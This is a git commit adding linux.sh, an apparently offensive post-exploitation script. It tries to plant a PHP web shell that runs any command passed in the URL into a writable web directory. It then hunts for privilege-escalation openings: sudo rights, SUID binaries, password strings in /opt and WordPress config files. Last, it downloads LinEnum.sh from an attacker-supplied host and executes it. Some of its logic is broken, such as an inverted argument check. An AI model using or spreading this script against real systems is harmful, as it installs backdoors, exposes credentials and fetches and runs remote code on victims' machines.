d92a5de1e1a58affe1c1c9453fc01bf9ca46b764
3therk1ll <richardcurteis@users.noreply.github.com>
2019-11-12 18:00:26 +0000

    Create linux.sh

---
+++ linux.sh
@@ -0,0 +1,40 @@
+#!/usr/bin/bash
+
+if [ -z "$1" ]
+  then
+    echo "Host Required"
+fi
+
+echo "#### Backdoor Install Attempt ####\n"
+echo "<?php passthru($_GET['cmd']); ?>" > /var/www/`find /var/www -perm -o+w` 1>/shell.php
+
+echo "#### Sudoers ####\n"
+sudo -l
+
+echo "#### Kernel ####\n"
+uname -a
+
+echo "#### SUID Files ####\n"
+find / -type f -perm -4000 2>/dev/null
+
+echo "#### Passwords in /opt?? ####\n"
+grep -iRl password /opt/*
+
+echo "#### Check /opt ####\n"
+ls -la /opt
+
+echo "#### Any wp-config files? ####\n"
+find / -name wp-config.php 2>/dev/null
+
+if [ -z "$2" ]
+  then
+	echo "#### Files Owned by User: $2 ####\n"
+    find / -user $2 2>/dev/null
+fi
+
+echo "#### Processes ####\n"
+ps aux
+
+echo "#### Download and Run LinEnum.sh ####\n"
+wget $1/LinEnum.sh
+bash LinEnum.sh
